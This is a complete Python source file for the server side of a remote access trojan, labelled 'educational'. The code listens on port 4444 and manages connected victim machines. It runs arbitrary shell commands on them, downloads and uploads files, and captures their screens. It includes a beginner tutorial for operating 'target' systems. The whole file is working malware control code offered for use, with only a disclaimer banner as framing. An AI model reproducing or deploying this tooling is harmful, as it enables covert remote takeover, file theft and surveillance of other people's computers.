#!/usr/bin/env python3
# Educational RAT Server - For learning purposes only
# This program should only be used in controlled test environments

import socket
import os
import sys
import base64
import threading
import platform
import time

# Global variables
clients = {}
current_client = None
stop_flag = False
prompt_symbol = "➤ "
server_status = "idle"  # idle, listening, connected

# Terminal colors for better UI (works on most platforms)
class Colors:
    HEADER = '\033[95m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    RED = '\033[91m'
    END = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

def print_banner():
    """Display the RAT server banner"""
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    banner = f"""
    {Colors.BLUE}╔═══════════════════════════════════════════════════════════════╗{Colors.END}
    {Colors.BLUE}║{Colors.END} {Colors.BOLD}Educational Remote Access Tool - Server{Colors.END}                 {Colors.BLUE}║{Colors.END}
    {Colors.BLUE}║{Colors.END} {Colors.RED}IMPORTANT: For educational purposes only{Colors.END}                 {Colors.BLUE}║{Colors.END}
    {Colors.BLUE}║{Colors.END} Use in controlled environments with proper authorization {Colors.BLUE}║{Colors.END}
    {Colors.BLUE}╚═══════════════════════════════════════════════════════════════╝{Colors.END}
    """
    print(banner)

def print_status():
    """Print current server status"""
    global server_status, current_client
    
    status_line = f"{Colors.BOLD}Server Status:{Colors.END} "
    
    if server_status == "idle":
        status_line += f"{Colors.YELLOW}Idle{Colors.END}"
    elif server_status == "listening":
        status_line += f"{Colors.GREEN}Listening for connections{Colors.END}"
    
    if current_client:
        client_info = current_client["info"].split("|")[0].strip()  # Get just system info
        status_line += f" | {Colors.BOLD}Connected to:{Colors.END} {Colors.GREEN}{client_info}{Colors.END}"
    
    connected = len(clients)
    status_line += f" | {Colors.BOLD}Total connections:{Colors.END} {Colors.GREEN}{connected}{Colors.END}"
    
    print(f"\n{status_line}")

def print_help(context="main"):
    """Show available commands based on context"""
    if context == "main":
        help_text = f"""
    {Colors.BOLD}Available Commands:{Colors.END}
    ------------------
    {Colors.GREEN}list{Colors.END}          - List all connected clients
    {Colors.GREEN}select <id>{Colors.END}   - Select a client by ID
    {Colors.GREEN}clear{Colors.END}         - Clear the screen
    {Colors.GREEN}exit{Colors.END}          - Exit the server
    {Colors.GREEN}help{Colors.END}          - Show this help message
    """
    elif context == "client":
        help_text = f"""
    {Colors.BOLD}Client Commands:{Colors.END}
    ------------------
    {Colors.GREEN}shell{Colors.END}         - Execute shell commands on target
    {Colors.GREEN}sysinfo{Colors.END}       - Get detailed system information
    {Colors.GREEN}upload <file>{Colors.END} - Upload a file to the client
    {Colors.GREEN}download <file>{Colors.END} - Download a file from the client
    {Colors.GREEN}screenshot{Colors.END}    - Capture client's screen
    {Colors.GREEN}back{Colors.END}          - Return to main menu
    {Colors.GREEN}help{Colors.END}          - Show this help message
    """
    print(help_text)

def print_menu():
    """Print the current menu"""
    if current_client:
        prompt = f"{Colors.BOLD}[Client {list(clients.keys())[list(clients.values()).index(current_client)]}]{Colors.END}{prompt_symbol}"
    else:
        prompt = f"{Colors.BOLD}[Server]{Colors.END}{prompt_symbol}"
    return prompt

def clear_screen():
    """Clear terminal screen based on OS"""
    os.system('cls' if platform.system() == 'Windows' else 'clear')
    print_banner()
    print_status()

def setup_server(host, port):
    """Set up and start the server"""
    global server_status
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    
    try:
        server.bind((host, port))
        server.listen(5)
        server_status = "listening"
        print(f"{Colors.GREEN}[+] Server listening on {host}:{port}{Colors.END}")
        return server
    except Exception as e:
        print(f"{Colors.RED}[!] Error starting server: {e}{Colors.END}")
        sys.exit(1)

def accept_connections(server):
    """Accept incoming client connections"""
    global stop_flag
    global clients
    
    while not stop_flag:
        try:
            client_socket, address = server.accept()
            client_socket.setblocking(1)
            
            # Get client system information for identification
            client_socket.send("sysinfo".encode())
            client_info = client_socket.recv(1024).decode()
            
            # Assign client ID
            client_id = len(clients) + 1
            clients[client_id] = {
                "socket": client_socket,
                "address": address,
                "info": client_info
            }
            
            # Notify about new connection
            print(f"\n{Colors.GREEN}[+] New connection established:{Colors.END} {address[0]}:{address[1]} (ID: {client_id})")
            print(f"{Colors.GREEN}[+] Client info:{Colors.END} {client_info}")
            print(print_menu(), end="", flush=True)
            
        except Exception as e:
            if not stop_flag:
                print(f"\n{Colors.RED}[!] Error accepting connection: {e}{Colors.END}")
                break

def send_command(command):
    """Send command to the current client"""
    global current_client
    
    if not current_client:
        print(f"{Colors.RED}[!] No client selected. Use 'select <id>' first.{Colors.END}")
        return None
    
    try:
        current_client["socket"].send(command.encode())
        
        if command.startswith("download"):
            # Receiving file from client
            file_name = command.split(" ")[1]
            print(f"{Colors.YELLOW}[*] Downloading {file_name}...{Colors.END}")
            file_data = receive_file(current_client["socket"])
            
            if file_data:
                with open(file_name, "wb") as f:
                    f.write(file_data)
                return f"{Colors.GREEN}[+] File downloaded successfully:{Colors.END} {file_name}"
            else:
                return f"{Colors.RED}[!] File download failed{Colors.END}"
                
        elif command.startswith("upload"):
            # Sending file to client
            file_name = command.split(" ")[1]
            try:
                with open(file_name, "rb") as f:
                    file_data = f.read()
                
                print(f"{Colors.YELLOW}[*] Uploading {file_name}...{Colors.END}")
                file_size = len(file_data)
                current_client["socket"].send(str(file_size).encode())
                response = current_client["socket"].recv(1024).decode()
                
                if response == "ready":
                    current_client["socket"].sendall(file_data)
                    return current_client["socket"].recv(1024).decode()
                else:
                    return f"{Colors.RED}[!] Client not ready to receive file{Colors.END}"
            except FileNotFoundError:
                return f"{Colors.RED}[!] File not found: {file_name}{Colors.END}"
                
        elif command == "screenshot":
            # Handle screenshot reception
            print(f"{Colors.YELLOW}[*] Capturing screenshot...{Colors.END}")
            response = current_client["socket"].recv(4)
            if response == b"FAIL":
                return f"{Colors.RED}[!] Screenshot failed on client (pyautogui may not be installed){Colors.END}"
            
            size = int(current_client["socket"].recv(10).decode())
            current_client["socket"].send(b"ready")
            
            # Progress bar for large screenshots
            screenshot_data = b""
            downloaded = 0
            
            while downloaded < size:
                chunk = current_client["socket"].recv(4096)
                if not chunk:
                    break
                screenshot_data += chunk
                downloaded += len(chunk)
                
                # Show progress every 10%
                progress = int(downloaded * 100 / size)
                if progress % 10 == 0:
                    print(f"{Colors.YELLOW}[*] Screenshot download: {progress}%{Colors.END}", end="\r")
            
            print(f"{Colors.YELLOW}[*] Screenshot download: 100%{Colors.END}")
            
            # Save screenshot
            filename = f"screenshot_{current_client['address'][0]}_{time.strftime('%Y%m%d-%H%M%S')}.png"
            with open(filename, "wb") as f:
                f.write(screenshot_data)
            
            return f"{Colors.GREEN}[+] Screenshot saved as {filename}{Colors.END}"
            
        elif command == "sysinfo":
            # For system info, wait for response and format it nicely
            response = current_client["socket"].recv(4096).decode()
            return format_system_info(response)
            
        else:
            # For other commands, simply return the response
            response = current_client["socket"].recv(4096).decode()
            return response
            
    except Exception as e:
        print(f"{Colors.RED}[!] Error communicating with client: {e}{Colors.END}")
        return None

def format_system_info(info_string):
    """Format system info in a readable way"""
    info_parts = info_string.split('|')
    formatted = f"\n{Colors.BOLD}System Information:{Colors.END}\n" + "-" * 50 + "\n"
    
    for part in info_parts:
        if ":" in part:
            key, value = part.split(':', 1)
            formatted += f"{Colors.BOLD}{key.strip()}:{Colors.END} {value.strip()}\n"
    
    return formatted

def receive_file(client_socket):
    """Receive a file from client"""
    try:
        # Get file size first
        file_size_data = client_socket.recv(10).decode()
        file_size = int(file_size_data)
        
        # Tell client we're ready to receive
        client_socket.send("ready".encode())
        
        # Receive file data with progress indication
        data = b""
        downloaded = 0
        
        while downloaded < file_size:
            chunk = client_socket.recv(4096)
            if not chunk:
                break
            data += chunk
            downloaded += len(chunk)
            
            # Show progress every 10%
            progress = int(downloaded * 100 / file_size)
            if progress % 10 == 0:
                print(f"{Colors.YELLOW}[*] File download: {progress}%{Colors.END}", end="\r")
        
        print(f"{Colors.YELLOW}[*] File download: 100%{Colors.END}")
        return data
    except Exception as e:
        print(f"{Colors.RED}[!] Error receiving file: {e}{Colors.END}")
        return None

def list_clients():
    """List all connected clients"""
    if not clients:
        print(f"{Colors.YELLOW}[!] No clients connected{Colors.END}")
        return
        
    print(f"\n{Colors.BOLD}Connected Clients:{Colors.END}")
    print("-" * 60)
    print(f"{Colors.BOLD}ID  | IP Address       | Operating System      | Hostname{Colors.END}")
    print("-" * 60)
    
    for cid, client in clients.items():
        # Parse client info to get key details
        info = client["info"]
        os_info = "Unknown"
        hostname = "Unknown"
        
        for part in info.split("|"):
            if "System:" in part:
                os_info = part.split(":", 1)[1].strip()
            if "Node:" in part:
                hostname = part.split(":", 1)[1].strip()
        
        print(f"{cid:<3} | {client['address'][0]:<15} | {os_info:<20} | {hostname}")
    
    print("-" * 60)
    print(f"Total clients: {len(clients)}")
    print()

def handle_shell_mode(client_id):
    """Handle interactive shell mode with a client"""
    global current_client, prompt_symbol
    
    if client_id not in clients:
        print(f"{Colors.RED}[!] Client ID {client_id} not found{Colors.END}")
        return
    
    current_client = clients[client_id]
    client_os = "Unknown"
    
    for part in current_client["info"].split("|"):
        if "System:" in part:
            client_os = part.split(":", 1)[1].strip()
    
    print(f"{Colors.GREEN}[+] Entering interactive mode with Client {client_id} ({client_os}){Colors.END}")
    print(f"{Colors.YELLOW}[*] Type 'help' for available commands, 'back' to return to main menu{Colors.END}")
    
    # Set appropriate shell prompt based on OS
    if "Windows" in client_os:
        shell_prompt = f"{Colors.BOLD}[Client {client_id} - Windows]{Colors.END}{prompt_symbol}"
    elif "Linux" in client_os:
        shell_prompt = f"{Colors.BOLD}[Client {client_id} - Linux]{Colors.END}{prompt_symbol}"
    elif "Darwin" in client_os:
        shell_prompt = f"{Colors.BOLD}[Client {client_id} - macOS]{Colors.END}{prompt_symbol}"
    else:
        shell_prompt = f"{Colors.BOLD}[Client {client_id}]{Colors.END}{prompt_symbol}"
    
    # Shell command mode
    while True:
        try:
            cmd = input(shell_prompt).strip()
            
            if cmd.lower() == "back":
                current_client = None
                print(f"{Colors.GREEN}[+] Returned to main menu{Colors.END}")
                break
                
            elif cmd.lower() == "help":
                print_help("client")
                
            elif cmd.lower() == "clear":
                clear_screen()
                
            elif cmd:  # Only process non-empty commands
                result = send_command(cmd)
                if result:
                    print(result)
                    
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[*] Use 'back' to return to main menu or 'exit' to quit{Colors.END}")
            continue
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")

def show_shell_tutorial():
    """Show a brief tutorial for beginners on how to use shell commands"""
    tutorial = f"""
{Colors.BOLD}Shell Command Tutorial for Beginners:{Colors.END}
-------------------------------------
{Colors.YELLOW}Common Windows Commands:{Colors.END}
  dir                  - List files and directories
  cd <directory>       - Change directory
  type <file>          - Display file contents
  systeminfo           - Display system information

{Colors.YELLOW}Common Linux/macOS Commands:{Colors.END}
  ls                   - List files and directories
  cd <directory>       - Change directory
  cat <file>           - Display file contents
  uname -a             - Display system information

{Colors.YELLOW}Universal Commands in RAT:{Colors.END}
  sysinfo              - Get detailed system information
  download <file>      - Download a file from target
  upload <file>        - Upload a file to target
  screenshot           - Take a screenshot of target's screen
  back                 - Return to main menu
"""
    print(tutorial)

def main():
    """Main function to run the server"""
    global current_client
    global stop_flag
    global server_status
    
    print_banner()
    
    host = "0.0.0.0"  # Listen on all interfaces
    port = 4444       # Default port
    
    # Setup server
    server = setup_server(host, port)
    
    # Start thread to accept connections
    conn_thread = threading.Thread(target=accept_connections, args=(server,))
    conn_thread.daemon = True
    conn_thread.start()
    
    print_status()
    print_help()
    
    # Tutorial tip for beginners
    print(f"{Colors.YELLOW}[Tip] Start by waiting for connections, then use 'list' to see connected clients.{Colors.END}")
    
    # Main command loop
    while True:
        try:
            cmd = input(print_menu()).strip()
            
            if cmd == "help":
                if current_client:
                    print_help("client")
                else:
                    print_help("main")
                
            elif cmd == "tutorial" or cmd == "tips":
                show_shell_tutorial()
                
            elif cmd == "clear":
                clear_screen()
                
            elif cmd == "list":
                list_clients()
                
            elif cmd.startswith("select"):
                try:
                    client_id = int(cmd.split(" ")[1])
                    handle_shell_mode(client_id)
                except (IndexError, ValueError):
                    print(f"{Colors.RED}[!] Invalid command format. Use 'select <id>'{Colors.END}")
                    
            elif cmd == "exit":
                stop_flag = True
                print(f"{Colors.YELLOW}[+] Shutting down server...{Colors.END}")
                
                # Close all client connections
                for cid, client in clients.items():
                    try:
                        client["socket"].close()
                    except:
                        pass
                
                server.close()
                print(f"{Colors.GREEN}[+] Server closed.{Colors.END}")
                break
                
            elif cmd == "status":
                print_status()
                
            elif cmd == "":
                # Just show the prompt again for empty commands
                continue
                
            elif current_client:
                # Forward command to selected client
                result = send_command(cmd)
                if result:
                    print(result)
            else:
                print(f"{Colors.RED}[!] Unknown command: '{cmd}'. Type 'help' to see available commands.{Colors.END}")
                
        except KeyboardInterrupt:
            print(f"\n{Colors.YELLOW}[!] Press Ctrl+C again to exit or type 'exit'{Colors.END}")
            try:
                input()
                continue
            except KeyboardInterrupt:
                print(f"\n{Colors.YELLOW}[+] Exiting...{Colors.END}")
                stop_flag = True
                
                # Close all client connections
                for cid, client in clients.items():
                    try:
                        client["socket"].close()
                    except:
                        pass
                    
                server.close()
                break
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")

if __name__ == "__main__":
    # Check if terminal supports colors
    if platform.system() == "Windows":
        # Enable ANSI colors on Windows
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except:
            # If it fails, disable colors
            for attr in dir(Colors):
                if attr.isupper():
                    setattr(Colors, attr, '')
    
    try:
        main()
    except Exception as e:
        print(f"Fatal error: {e}")
        sys.exit(1) 